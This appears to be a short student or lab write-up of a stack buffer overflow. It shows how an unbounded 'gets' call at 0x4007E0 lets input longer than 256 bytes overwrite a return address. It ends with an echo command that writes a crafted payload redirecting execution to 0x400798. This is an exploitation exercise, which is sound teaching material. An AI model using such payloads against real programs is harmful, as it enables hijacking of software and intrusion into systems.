The buffer overflow can occur at instruction 0x4007E0, where "gets" is called. Since gets will just get a string for as many characters there are available, and since it is saving to a location with a fixed memory size of 0x100 bytes, you can overflow that memory and thus overwrite the return address. To do so, simply enter more than 0x100 bytes of input (i.e. more than 256 characters)

The instructions to force this overflow to occur are as follows (note: I realize now that maintaining the RBP is not strictly necessary, but it doesn't hurt):
echo -e '0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x00\x00\x80\xe0\xfd\xff\xff\x7f\x98\x07\x40\x00\x00\x00\x00\x00\x10' > echo_temp.txt
